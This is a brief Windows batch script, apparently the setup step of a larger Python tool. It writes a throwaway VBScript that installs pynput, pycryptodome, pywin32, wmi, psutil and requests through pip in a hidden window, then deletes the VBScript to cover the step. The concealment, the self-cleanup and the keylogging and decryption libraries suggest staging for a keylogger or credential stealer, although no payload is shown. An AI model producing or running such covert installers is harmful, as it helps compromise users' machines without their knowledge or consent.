��&cls
@echo off

echo Set objShell = WScript.CreateObject("WScript.Shell") > %TEMP%\hidden.vbs
echo objShell.Run "cmd /c python -m pip install requests pycryptodome pypiwin32 psutil pywin32 wmi pynput", 0, True >> %TEMP%\hidden.vbs

cscript //nologo %TEMP%\hidden.vbs

REM Geçici .vbs dosyasını sil
del %TEMP%\hidden.vbs
